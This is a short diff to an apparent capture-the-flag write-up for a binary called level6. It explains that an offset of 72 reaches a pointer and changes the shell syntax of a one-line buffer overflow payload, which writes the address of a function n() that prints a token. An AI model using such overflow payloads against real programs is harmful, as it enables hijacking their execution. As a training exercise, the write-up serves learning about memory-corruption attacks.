@@ -40,4 +40,4 @@ The offset is 72.
 
 So if we put the address of n() at the offset of the buffer, we will land in the n() function and it will print the token.
 
-`./level6 \`python -c 'print("A"*72 + "\x54\x84\x04\x08")'\``
+`./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')`
